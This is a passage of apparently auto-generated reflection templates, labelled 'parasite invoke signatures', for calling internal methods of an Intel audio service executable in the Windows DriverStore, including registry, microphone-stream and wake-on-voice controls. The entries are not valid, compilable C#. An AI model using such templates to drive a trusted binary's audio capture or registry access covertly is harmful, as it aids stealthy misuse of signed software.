        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.FarfieldClientMethods"", true);
        var methodInfo = t.GetMethod(""Reset"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { FarfieldClientSafeHandle _ffClientPtr });
        ===END SIGNATURE===

Method: GetServiceRegistryStateKeyExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.IntelRegistryMethods"", true);
        var methodInfo = t.GetMethod(""GetServiceRegistryStateKeyExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr _serviceStatusHandle, SERVICE_REGISTRY_STATE_TYPE _stateType, IntPtr& _serviceStateKey });
        ===END SIGNATURE===

Method: GetRegKeyValueExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.IntelRegistryMethods"", true);
        var methodInfo = t.GetMethod(""GetRegKeyValueExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr _hKey, string _keyName, IntPtr& _keyValue });
        ===END SIGNATURE===

Method: ReadInterfaceRegistryKeyExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.IntelRegistryMethods"", true);
        var methodInfo = t.GetMethod(""ReadInterfaceRegistryKeyExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { string _deviceName, IntPtr& _registryKey });
        ===END SIGNATURE===

Method: RegCloseKeyExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.IntelRegistryMethods"", true);
        var methodInfo = t.GetMethod(""RegCloseKeyExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr _keyValue });
        ===END SIGNATURE===

Method: CreatePpDllClientInstance
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.PpDllMethods"", true);
        var methodInfo = t.GetMethod(""CreatePpDllClientInstance"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        IntelAudioService.ControlModuleWrapper.PpDllClientSafeHandle result = (IntelAudioService.ControlModuleWrapper.PpDllClientSafeHandle) methodInfo.Invoke(null, new object[] { string _ppDllPath });
        ===END SIGNATURE===

Method: DisposePpDllClient
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.PpDllMethods"", true);
        var methodInfo = t.GetMethod(""DisposePpDllClient"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntPtr _ppDllClientHandle });
        ===END SIGNATURE===

Method: IntelSstPreProcGetSize
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.PpDllMethods"", true);
        var methodInfo = t.GetMethod(""IntelSstPreProcGetSize"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { PpDllClientSafeHandle _ppDllHandle, IntelSstBasicConfiguration& _configuration, Int32& _memorySize });
        ===END SIGNATURE===

Method: IntelSstPreProcInitialize
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.PpDllMethods"", true);
        var methodInfo = t.GetMethod(""IntelSstPreProcInitialize"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { PpDllClientSafeHandle _ppDllHandle, IntPtr& _instance, IntelSstBasicConfiguration& _configuration, ICLogger& _logger });
        ===END SIGNATURE===

Method: IntelSstPreProcSetConfig
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.PpDllMethods"", true);
        var methodInfo = t.GetMethod(""IntelSstPreProcSetConfig"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { PpDllClientSafeHandle _ppDllHandle, IntPtr _instance, IntPtr _configBlob, uint _blobSize });
        ===END SIGNATURE===

Method: IntelSstPreProcGetLatency
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.PpDllMethods"", true);
        var methodInfo = t.GetMethod(""IntelSstPreProcGetLatency"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { PpDllClientSafeHandle _ppDllHandle, IntPtr _instance, Int32& _msLatency });
        ===END SIGNATURE===

Method: IntelSstPreProcProcess
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.PpDllMethods"", true);
        var methodInfo = t.GetMethod(""IntelSstPreProcProcess"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { PpDllClientSafeHandle _ppDllHandle, IntPtr _instance, IntelSstInput& _input, IntPtr _outputBuffer });
        ===END SIGNATURE===

Method: IntelSstPreProcBurstProcess
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.PpDllMethods"", true);
        var methodInfo = t.GetMethod(""IntelSstPreProcBurstProcess"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { PpDllClientSafeHandle _ppDllHandle, IntPtr _instance, IntelSstBurstInput& _input, IntPtr _outputBuffer });
        ===END SIGNATURE===

Method: IntelSstPreProcReset
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.PpDllMethods"", true);
        var methodInfo = t.GetMethod(""IntelSstPreProcReset"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { PpDllClientSafeHandle _ppDllHandle, IntPtr _instance });
        ===END SIGNATURE===

Method: IntelSstPreProcRelease
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.PpDllMethods"", true);
        var methodInfo = t.GetMethod(""IntelSstPreProcRelease"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { PpDllClientSafeHandle _ppDllHandle, IntPtr _instance });
        ===END SIGNATURE===

Method: CreateLpalListenerInstance
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""CreateLpalListenerInstance"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        IntelAudioService.ControlModuleWrapper.IntelListenerSafeHandle result = (IntelAudioService.ControlModuleWrapper.IntelListenerSafeHandle) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: DisposeLpalListener
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""DisposeLpalListener"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntPtr _listnerHandle });
        ===END SIGNATURE===

Method: LCloseAllSessions
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""LCloseAllSessions"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelListenerSafeHandle _listnerHandle });
        ===END SIGNATURE===

Method: LCreateStream
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""LCreateStream"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelListenerSafeHandle _listnerHandle, uint _pid, string _ppMemoryName, string _rawMemoryName, uint _channelsCount, eIntcSpeechMode _speechMode, bool _enablePreprocessing });
        ===END SIGNATURE===

Method: LDestroyStream
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""LDestroyStream"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelListenerSafeHandle _listnerHandle, uint _pid });
        ===END SIGNATURE===

Method: LStart
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""LStart"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelListenerSafeHandle _listnerHandle, uint _pid });
        ===END SIGNATURE===

Method: LStop
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""LStop"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelListenerSafeHandle _listnerHandle, uint _pid });
        ===END SIGNATURE===

Method: LCfg
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""LCfg"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelListenerSafeHandle _listnerHandle, bool _stopStreamingOnWup, uint _keyPhraseDetectionSensitivity, string _sDataBlobFilePath, string _sDataReservedFilePath });
        ===END SIGNATURE===

Method: LRead
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""LRead"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelListenerSafeHandle _listnerHandle, uint _pid, Double& _performanceDiff });
        ===END SIGNATURE===

Method: LQueryNotif
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""LQueryNotif"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelListenerSafeHandle _listnerHandle, uint _pid, eIntcEventNotificationType& _notificationType });
        ===END SIGNATURE===

Method: LGetBufferMetadata
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""LGetBufferMetadata"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelListenerSafeHandle _listnerHandle, uint _pid, BufferMetadata& _bufferMetadata });
        ===END SIGNATURE===

Method: LGetDetectionData
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""LGetDetectionData"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelListenerSafeHandle _listnerHandle, uint _pid, DetectionData& _detectionData });
        ===END SIGNATURE===

Method: LOpenStream
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""LOpenStream"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelListenerSafeHandle _listnerHandle, uint _pid });
        ===END SIGNATURE===

Method: LWaitHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""LWaitHandle"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntelListenerSafeHandle _listnerHandle, uint _pid });
        ===END SIGNATURE===

Method: LQuerySpeechMode
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""LQuerySpeechMode"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelListenerSafeHandle _listnerHandle, uint _pid, eIntcSpeechMode& _speechMode });
        ===END SIGNATURE===

Method: LReset
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""LReset"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelListenerSafeHandle _listnerHandle, uint _pid });
        ===END SIGNATURE===

Method: GetEx
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.ControlModuleException"", true);
        var methodInfo = t.GetMethod(""GetEx"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { String& _message });
        ===END SIGNATURE===

Method: CreateWoVControlInstance
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""CreateWoVControlInstance"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        IntelAudioService.ControlModuleWrapper.WovControl.IntelWovSafeHandle result = (IntelAudioService.ControlModuleWrapper.WovControl.IntelWovSafeHandle) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: DisposeWoVControl
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""DisposeWoVControl"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntPtr _wovHandle });
        ===END SIGNATURE===

Method: InitializeKsControl
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""InitializeKsControl"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr });
        ===END SIGNATURE===

Method: UnloadKsControl
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""UnloadKsControl"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr });
        ===END SIGNATURE===

Method: WovConfigWaitHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""WovConfigWaitHandle"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr });
        ===END SIGNATURE===

Method: CreateKsStream
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""CreateKsStream"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr, uint _pid });
        ===END SIGNATURE===

Method: StartStream
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""StartStream"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr });
        ===END SIGNATURE===

Method: RunStream
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""RunStream"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr });
        ===END SIGNATURE===

Method: StopKsStream
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""StopKsStream"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr });
        ===END SIGNATURE===

Method: GetSpeechDeviceId
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""GetSpeechDeviceId"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr, String& _speechPinId });
        ===END SIGNATURE===

Method: UnloadPpClient
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""UnloadPpClient"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr });
        ===END SIGNATURE===

Method: UnregisterKsEventHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""UnregisterKsEventHandle"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr });
        ===END SIGNATURE===

Method: ActivateDevice
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""ActivateDevice"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr, string _deviceId });
        ===END SIGNATURE===

Method: RemoveDevice
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""RemoveDevice"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr, string _deviceId, Int32& _devicesLeft });
        ===END SIGNATURE===

Method: AddDevice
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""AddDevice"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr, string _deviceId });
        ===END SIGNATURE===

Method: IsCaptureDevice
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""IsCaptureDevice"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr, string _deviceId });
        ===END SIGNATURE===

Method: IsLpCapableDevice
        ===PARASITE INVOKE SIGNATURE===
